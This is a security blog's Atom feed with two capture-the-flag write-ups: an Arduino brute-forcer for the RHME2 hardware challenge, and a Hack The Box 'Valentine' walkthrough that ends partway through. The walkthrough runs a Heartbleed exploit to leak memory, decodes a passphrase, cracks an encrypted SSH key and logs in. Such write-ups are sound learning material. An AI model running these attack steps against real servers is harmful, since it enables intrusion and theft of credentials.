@@ -1,0 +1,1373 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<feed xmlns="http://www.w3.org/2005/Atom" >
+  <generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator>
+  <link href="/tag/ctf/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="/" rel="alternate" type="text/html" />
+  <updated>2025-09-09T13:46:37+00:00</updated>
+  <id>/tag/ctf/feed.xml</id>
+
+  
+  
+  
+
+  
+    <title type="html">Securityits.io | </title>
+  
+
+  
+    <subtitle>Security researching from the nordics</subtitle>
+  
+
+  
+
+  
+    
+      
+    
+  
+
+  
+  
+
+  
+    <entry>
+      <title type="html">Reverse Engineering an unknown digital protocol: RHME2, Whac a mole</title>
+      <link href="/reverse-engineering-an-unknown-digital-protocol" rel="alternate" type="text/html" title="Reverse Engineering an unknown digital protocol: RHME2, Whac a mole" />
+      <published>2021-05-18T00:00:00+00:00</published>
+      <updated>2021-05-18T00:00:00+00:00</updated>
+      <id>/reverse-engineering-an-unknown-digital-protocol</id>
+      <content type="html" xml:base="/reverse-engineering-an-unknown-digital-protocol">&lt;blockquote&gt;
+  &lt;p&gt;Who doesn’t like a classic game of whac-the-mole? This time the moles infiltrated deep into the backyard of a poor farmer’s family. The moles are ruining the crops, which the farmer desperately needs to provide for his wife and 2 children. Any traveler able to help him by extinguishing the darn things will be greatly rewarded. Are you up for the task?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So I wanted to do some more hardware based CTF, especially now in covid times I don’t get out as much to client sites doing some of these things on site. So I picked up yet another Riscure RHME2 CTF binary and tossed it into one of my Arduino Nano boards to have a go at it! This time I’ll tackle the challenge Whack a Mole (links are down below) which is a (at the time of writing) 5 year old challenge, but it’s been on my todo list for a while.&lt;/p&gt;
+
+&lt;h2 id=&quot;setup&quot;&gt;Setup&lt;/h2&gt;
+&lt;p&gt;So the Bill of Materials needed are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;2x Arduino Nano&lt;/li&gt;
+  &lt;li&gt;Breadboard&lt;/li&gt;
+  &lt;li&gt;Various cables for the breadboard&lt;/li&gt;
+  &lt;li&gt;Digital Oscilloscope with at least one channel (I used a Rigol DS1054Z)&lt;/li&gt;
+  &lt;li&gt;Optional: Logic Analyzer&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Lets kick things off by actually loading the binary onto our target arduino. The writing of the binary will be done by using avrdude, which is available in most package repos.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# wget https://github.com/Riscure/Rhme-2016/raw/master/challenges/binaries/whac_the_mole/whac_the_mole.hex
+root@linux:~# avrdude -c arduino -p atmega328p -p /dev/&amp;lt;NANO Device&amp;gt; -b115200 -u -V -U flash:w:whac_the_mole.hex
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Doing that should produce a successful flash of the device with the correct binary. The next step is to power up the board and check if there’s any data on the serial connection. But to do that we also need to find the baudrate of the device, which can be done by either trying and getting lucky, or using the oscilloscope to measure the peaks and data rate that is sent. But before actually hooking up the scope to the circuit,I highly recommend looking through EEVblogs guide on “&lt;a href=&quot;https://www.youtube.com/watch?v=xaELqAo4kkQ&quot;&gt;How NOT to blow up your oscilloscope&lt;/a&gt;”, first and last warning!&lt;/p&gt;
+
+&lt;p&gt;So just to give the low down on serial communication. Devices communicate over a serial connection to other devices, it does so in binary representation by managing Peaks and Valleys on a digital connection. The Digital connection have two states:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;+5/3.3v represent a 0&lt;/li&gt;
+  &lt;li&gt;+/-0v represent a 1&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;That means when hooking up a oscilloscope to a serial connection, we’ll see a natural +5v baseline on the screen. It also means that when we are triggering the probe in order to pause the data on the screen, we need to trigger on a downward slope. So hooking up the scope to the target Tx pin (Nano Pin0), setting the trigger to a -2.5v downward slope on the correct probe and resetting the arduino board we get presented with a fixed image of a serial transmission. Looking at the oscilloscopes automagic measurements, it’s quite easy to determine a Rate of 192kV/s, so a baudrate of 19200 will work perfectly. Another great feature of the DS1054Z and many other digital oscilloscopes is that it can do RS232 decode directly in the device. Plugging in the known baudate to the Decode function outputs some of the sent strings.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/RS232_Decode.png&quot; alt=&quot;Oscilloscope Serial Decoding&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;first-connection&quot;&gt;First Connection&lt;/h2&gt;
+
+&lt;p&gt;Having that knowledge that we have the correct baudrate, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;screen /dev/&amp;lt;NANO Target&amp;gt; 19200&lt;/code&gt; or whichever fancy serial program that’s available. Once connected we get presented by the following screen:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@linux:~# screen /dev/ttyUSB0 19200
+Welcome adventurer.
+
+We are glad you are here. We are in dire need of assistance.
+A huge family of moles have found their way into our yard.
+We need you to get rid of all 20 of them.
+If you manage to extinguish them all we will greatly reward you.
+When you are ready, please step into the yard by pressing &amp;lt;Enter&amp;gt;
+
+Ready?
+Get set!
+GO!
+You missed it. Try again by pressing &amp;lt;Enter&amp;gt;.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Pressing enter at the screen just gives the following message over and over again, and the program does not seem to accepts characters or and form of input over the Serial connection. So it is time to start exploring other options!&lt;/p&gt;
+
+&lt;p&gt;The name of the challenge, refer to the physical game of Whack the mole! which is a carnival game where heads pop up through holes, and the objective is to hit those in order to score points. Ok so that’s easy enough if you’d know where to hit the moles.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Arduino-Nano-pinout.png&quot; alt=&quot;Arduino Nano pinout schematic from http://lab.dejaworks.com/arduino-nano-pinouts/&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the schematics of the Arduino Nano, we can identify that there are a bunch of digital pins. 0/1 are dedicated to Tx and Rx for the Serial, 2-13 are dedicated Digital pins, and 14-19 are analog pins. Lets hook up a Logic Analyzer to the digital pins in order to see if there’s any other signals.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Lab-desktop-saleae.jpg&quot; alt=&quot;Saleae Logic Setup&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hooking up the Saleae Logic to the 2-8 pins gave no results after pressing enter on the Serial Prompt, but taking the next set of pins 9-13 and A0-A2 resulted in some traffic on the yellow cable, Channel 4, which was connected to the pin D13.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Logic_analyzer_software.png&quot; alt=&quot;Logic Software result&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;making-some-assumptions&quot;&gt;Making some assumptions&lt;/h2&gt;
+&lt;p&gt;While further investigating the board and signals, I went in with a couple assumptions&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The Signals on pin D13, reflected the pin to hit&lt;/li&gt;
+  &lt;li&gt;The pin should be one of the other Digital pins 2-12&lt;/li&gt;
+  &lt;li&gt;There are multiple levels and not just one hit that has to be made&lt;/li&gt;
+  &lt;li&gt;The signal should be received within 100ms from the peak&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;While I was successful in making one or two hits and manually mapping out the pins that needed to be hit, each time that the board target resets the pins changed. Which pushed me in the direction of needing to do some proper logic on the micro controller in order to automate the process as much as possible.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/Multiple_hits.png&quot; alt=&quot;Registering multiple mole whacks using the oscilloscope&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;codesplaining&quot;&gt;Codesplaining&lt;/h2&gt;
+&lt;p&gt;In order to successfully automate the process of retrieving the flag there are some code requirements:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;Be able to bruteforce multiple pins&lt;/li&gt;
+  &lt;li&gt;The amount of observable peaks are between 1-6&lt;/li&gt;
+  &lt;li&gt;Automated process of verifying and resetting the board&lt;/li&gt;
+  &lt;li&gt;The time to hit should be ~100ms&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;So in order to solve the resetting and verifying problem, I relied on using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SoftwareSerial.h&lt;/code&gt; library, as that can create a Software emulated Serial Tx/Rx out of any other pin. The idea was to interpret the messages that the target board was echoing depending if you hit a mole or not. Where the different states are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;You whacked it &amp;gt; Success&lt;/li&gt;
+  &lt;li&gt;You missed it &amp;gt; fFail&lt;/li&gt;
+  &lt;li&gt;Welcome &amp;gt; Start of the game&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;With that set, came the problem of number 1, to bruteforce the pins. We know from the research that there are pins 2-12 as input on the target board to hit, and there are a maximum of 6 peaks on each iteration.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int candidates[6] = {2, 2, 2, 2, 2, 2};
+int pins[6] = {0, 0, 0, 0, 0, 0};
+
+void peak(int pin){
+    digitalWrite(pin, HIGH);
+    delay(PEAKDELAY);
+    digitalWrite(pin, LOW);
+  }
+
+void whack(int pin){
+    digitalWrite(PIN_MONITOR, HIGH);
+    if (pins[pin] != 0) {
+      peak(pins[pin]);
+    } else {
+      peak(candidates[pin]);
+    }
+    digitalWrite(PIN_MONITOR, LOW);
+  }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The bruteforce function simply checks the amount of peaks that are registered on the input D13 pin, which corresponds to the array &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pins[n]&lt;/code&gt;. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pin[peak] is 0&lt;/code&gt; try the pin in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;candidates[peak]&lt;/code&gt; in this case, it starts by sending a peak out on pin D2. If the hit missed, the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;miss()&lt;/code&gt; will increase &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;candidates[peak]&lt;/code&gt; with one, so that the next time the program registers the same peak it will try pin D3. If however the peak would be a hit, the method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hit()&lt;/code&gt; will be called and register pin D2 into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pins[n]&lt;/code&gt; table to be remembered for the future identical number of peaks.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/bruteforce.png&quot; alt=&quot;Console of the microcontroller which is performing the bruteforce&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Running the code should eventually bruteforce each pin position, and print the flag in your terminal connected to the target!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2021/05/reverse-engineering-an-unknown-digital-protocol/flag.png&quot; alt=&quot;Successful bruteforce of the pin positions for the flag on the target Nano&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;source-code&quot;&gt;Source Code&lt;/h3&gt;
+&lt;p&gt;Putting all the code together should look something like:
+    #include &lt;SoftwareSerial.h&gt;&lt;/SoftwareSerial.h&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define MAXPINS 12
+#define PEAKDELAY 30
+#define BAUDRATE 19200
+#define SER_TX 18
+#define SER_RX 19
+#define PIN_READ 13
+#define PIN_MONITOR 14
+
+int state = 0;
+int peak_count;
+int peak_state;
+int top_level = 1;
+int current_level = 1;
+
+char inData;
+String strBuf;
+String str;
+unsigned long peak_start = 0;
+
+String pins_used[12] = {&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;,&quot;[ ]&quot;};
+int candidates[6] = {2, 2, 2, 2, 2, 2};
+int pins[6] = {0, 0, 0, 0, 0, 0};
+
+SoftwareSerial target(SER_RX, SER_TX);
+
+void setup() {
+  Serial.begin(BAUDRATE);
+
+  pinMode(PIN_READ, INPUT);
+  pinMode(PIN_MONITOR, OUTPUT);
+  digitalWrite(PIN_MONITOR, LOW);
+
+  for (int i=2;i&amp;lt;MAXPINS+1;i++){
+    pinMode(i, OUTPUT);
+    digitalWrite(i, LOW);
+    }
+
+  Serial.println(&quot;Ready&quot;);
+  target.begin(19200);
+}
+
+void set_used_pins(int pin){
+  if (pins_used[pin-1] == &quot;[ ]&quot;)
+    pins_used[pin-1] = &quot;[*]&quot;;
+  }
+
+void print_status(){
+  for (int i=0;i&amp;lt;2;i++) Serial.println(&quot;\r&quot;);  
+  Serial.print(&quot;Used Pins: &quot;);
+  for (int i=0;i&amp;lt;12;i++){
+    Serial.print(pins_used[i]);
+    Serial.print(&quot; &quot;);
+  }
+  Serial.println(&quot;\r&quot;);
+  Serial.println(&quot;------------------&quot;);
+  Serial.print(&quot;Peaks: 1 2 3 4 5 6  &quot;);
+  Serial.print(&quot;| Level: &quot;);
+  Serial.println(current_level);
+  Serial.print(&quot;Pins : &quot;);
+
+  for (int i=0;i&amp;lt;6;i++){
+    Serial.print(pins[i]);
+    Serial.print(&quot; &quot;);
+    }
+
+  Serial.print(&quot; | Top: &quot;);
+  Serial.print(top_level);
+  Serial.println(&quot;/50&quot;);
+}
+
+void peak(int pin){
+    digitalWrite(pin, HIGH);
+    delay(PEAKDELAY);
+    digitalWrite(pin, LOW);
+  }
+
+void whack(int pin){
+    digitalWrite(PIN_MONITOR, HIGH);
+    if (pins[pin] != 0) {
+      peak(pins[pin]);
+    } else {
+      peak(candidates[pin]);
+    }
+    digitalWrite(PIN_MONITOR, LOW);
+  }
+
+void hit(){
+    if (pins[peak_state] == 0){
+        int candidate = candidates[peak_state];
+        set_used_pins(candidate);
+        pins[peak_state] = candidate;
+      }
+    print_status();
+    current_level++;
+    if (current_level &amp;gt; top_level)
+      top_level++;
+  }
+
+void miss(){
+    candidates[peak_state] = candidates[peak_state] + 1;
+
+    if (candidates[peak_state] &amp;gt; 12){
+      Serial.println(&quot;INVALID PIN.... Resetting to 2&quot;);
+      candidates[peak_state] = 2;
+    }
+
+    print_status();
+    current_level = 0;
+  }
+
+void loop() {
+  while(target.available()){
+    inData = target.read();
+    strBuf += inData;
+    }
+
+  if (strBuf.endsWith(F(&quot;\n&quot;))){
+    strBuf.trim();
+    if (strBuf.length() &amp;gt; 0) { str = strBuf; }
+    strBuf = &quot;&quot;;
+    }
+
+  if (str.indexOf(F(&quot;missed&quot;)) &amp;gt;= 0) {
+    miss();
+    str = &quot;&quot;;
+    target.write(&quot;\r&quot;);
+
+  } else if (str.indexOf(F(&quot;whacked&quot;)) &amp;gt;= 0) {
+    hit();
+    str = &quot;&quot;;     
+
+  } else if (str.indexOf(F(&quot;When you are ready&quot;)) &amp;gt;= 0) {
+    Serial.println(&quot;Start the game&quot;);
+    delay(500);
+    print_status();
+    str = &quot;&quot;;
+    target.write(&quot;\r&quot;);
+  }
+
+  int value = digitalRead(PIN_READ);
+  if (value != state){
+    state = value;
+    if (state == 1){
+      peak_start = millis();
+      peak_count++;
+      }
+    }
+
+  if (state == 0 &amp;amp;&amp;amp; peak_start &amp;amp;&amp;amp; peak_start + 100 &amp;lt; millis()){
+    peak_state = peak_count - 1;
+    whack(peak_state);
+    peak_start = 0;
+    peak_count = 0;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;resources&quot;&gt;Resources&lt;/h3&gt;
+&lt;p&gt;The complete source code and fritzing scheme can be found at:&lt;br /&gt;
+Fritzing - &lt;a href=&quot;https://blog.securitybits.io/assets/files/2021/05/reverse-engineering-an-unknown-digital-protocol/scheme.fzz&quot;&gt;scheme.fzz&lt;/a&gt;&lt;br /&gt;
+Arduino Sketch - &lt;a href=&quot;https://blog.securitybits.io/assets/files/2021/05/reverse-engineering-an-unknown-digital-protocol/whacker.ino&quot;&gt;whacker.ino&lt;/a&gt;&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Christoffer Claesson</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="hardware" />
+      
+        <category term="ctf" />
+      
+        <category term="security" />
+      
+
+      
+        <summary type="html">Who doesn’t like a classic game of whac-the-mole? This time the moles infiltrated deep into the backyard of a poor farmer’s family. The moles are ruining the crops, which the farmer desperately needs to provide for his wife and 2 children. Any traveler able to help him by extinguishing the darn things will be greatly rewarded. Are you up for the task?</summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">Valentine Writeup</title>
+      <link href="/valentine-writeup" rel="alternate" type="text/html" title="Valentine Writeup" />
+      <published>2018-07-27T00:00:00+00:00</published>
+      <updated>2018-07-27T00:00:00+00:00</updated>
+      <id>/valentine-writeup</id>
+      <content type="html" xml:base="/valentine-writeup">&lt;blockquote&gt;
+  &lt;p&gt;Heartbleeds and dirty cows, i feel sorry for the creator!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Connecting to Hack the Box&lt;sup id=&quot;fnref:1&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:1&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; using the supplied VPN, my Valentine box have the IP: 10.10.10.79
+As per usual, lets start with Recon and NMAP the target IP&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ nmap -p- --version-all -sV -sS 10.10.10.79
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-02 22:27 CET
+Nmap scan report for 10.10.10.79
+Host is up (0.049s latency).
+Not shown: 65532 closed ports
+PORT      STATE  SERVICE   VERSION
+22/tcp    open   ssh       OpenSSH 5.9p1 Debian 5ubuntu1.10
+80/tcp    open   http      Apache httpd 2.2.22 ((Ubuntu))
+443/tcp   open   ssl/http  Apache httpd 2.2.22 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 51.78 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we are dealing with some kind of webserver.
+The root directory of the address is only displaying an image on both webports (80/443), next step would be trying to enumerate directories!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/07/valentine-writeup/omg-1.jpg&quot; alt=&quot;Valentine root image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I usually use the tool “gobuster” to enumerate webdirectories with a wordlist, and point it to Burpsuite Proxy. That way, any link or directory that gobuster finds, will Burpsuite automatically spider as well as record in its console.&lt;br /&gt;
+So lets point gobuster towards the webserver and let it run in the background.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ gobuster -u http://10.10.10.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -p 127.0.0.1:8080 -x php
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now sticking with the theme Valentine, the image is referencing the exploit Heartbleed&lt;sup id=&quot;fnref:2&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:2&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; which targets SSL (port 443). its also available on ExploitDB, therefor there’s a local variant in kali. You might though have to run this a couple times to get the data that’s relevant.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ searchsploit heartbleed
+root@kali:~/Valentine$ cp /usr/share/exploitdb/exploits/multiple/remote/32764.py .
+root@kali:~/Valentine$ python 32764.py 10.10.10.79 &amp;gt; heartbleed.txt
+root@kali:~/Valentine$ cat heartbleed.txt
+[..snip..]
+00f0: 01 00 00 00 10 00 0E 00 00 0B 31 30 2E 31 30 2E ..........10.10.
+0100: 31 30 2E 37 39 6F 6E 2F 78 2D 77 77 77 2D 66 6F 10.79on/x-www-fo
+0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C
+0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4
+0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc
+0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld
+0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 43 mV0aGVoeXBlCg==C
+0160: 05 16 1F AC BA A4 D1 E0 45 10 F2 B0 B6 9E 4B 30 ........E.....K0
+0170: 01 06 7D 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C ..}.............
+0180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+[..snip..]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now that $text parameter in the response looks like a base64 encoded string.&lt;br /&gt;
+$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==' | base64 -d
+heartbleedbelievethehype
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Lets save that to the notes and pop back to see what the result of gobuster is up to.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Gobuster v1.2                OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.79/
+[+] Threads      : 200
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 302,307,200,204,301
+[+] Proxy        : 127.0.0.1:8080
+[+] Extensions   : .php
+=====================================================
+/index (Status: 200)
+/index.php (Status: 200)
+/dev (Status: 301)
+/encode (Status: 200)
+/encode.php (Status: 200)
+/decode (Status: 200)
+/decode.php (Status: 200)
+/omg (Status: 200)
+=====================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So encode and decode just seems to be two php functions that does what they say to base64 strings. They didn’t seems that vulnerable to command injections either. But /dev looks interesting , browsing to that reveals two files.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;assets/images/posts/2018/07/valentine-writeup/Valentine_Slash_dev.png&quot; alt=&quot;Valentine_Slash_dev&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Taking a peek at notes.txt shows a checklist.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;To do:
+
+1) Coffee.
+2) Research.
+3) Fix decoder/encoder before going live.
+4) Make sure encoding/decoding is only done client-side.
+5) Don't use the decoder/encoder until any of this is done.
+6) Find a better way to take notes.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The file hype_key contains an ASCII encoded SSH Private Key, so download that and pipe it to xxd.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ cat hype_key | xxd -r -p &amp;gt; rsa.encrypted
+root@kali:~/Valentine$ cat rsa.encrypted
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
+
+DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
+[..super snip..]
+RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;According to Proc-Type its encrypted, so next step would be to decrypt it using JohnTheRipper!&lt;br /&gt;
+First lets create a JTR compatible file to crack, then remembering the decoded base64 string before, might be the password.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ ssh2john rsa.encrypted &amp;gt; rsa.john
+root@kali:~/Valentine$ echo &quot;heartbleedbelievethehype&quot; | john --stdin rsa.johnssh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That should successfully crack the Private Key!&lt;br /&gt;
+Now we only need to change the permissions and try to connect, what we’re missing is the username to connect with, but reading the private keys filename “hype_key”, we can always try “hype”.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Valentine$ chmod 0600 rsa.encrypted
+root@kali:~/Valentine$ ssh -i rsa.encrypted hype@10.10.10.79
+Enter passphrase for key 'rsa.encrypted': heartbleedbelievethehype
+Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
+New release '14.04.5 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
+hype@Valentine:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So that takes care of the initial shell, now lets enumerate the system and see what we can find out to Privilege Escalate to root!&lt;br /&gt;
+G0tmi1k&lt;sup id=&quot;fnref:3&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:3&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; Has a really good cheat sheets in how to enumerate linux systems!&lt;br /&gt;
+So lets do some basic things.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hype@Valentine:~$ uname -a
+Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So having a kernel means that it might be vulnerable to the Dirtycow&lt;sup id=&quot;fnref:4&quot; role=&quot;doc-noteref&quot;&gt;&lt;a href=&quot;#fn:4&quot; class=&quot;footnote&quot; rel=&quot;footnote&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; exploit.&lt;br /&gt;
+But generally using such exploit is frowned upon since it might crash the box and ruin the day for other people.&lt;br /&gt;
+So lets continue enumerating and hope we find something else.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hype@Valentine:~$ history
+.....snip....
+8 ls -la
+9 tmux -L dev_sess
+10 tmux a -t dev_sess
+11 tmux --help
+12 tmux -S /.devs/dev_sess
+13 exit
+.....snip....
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
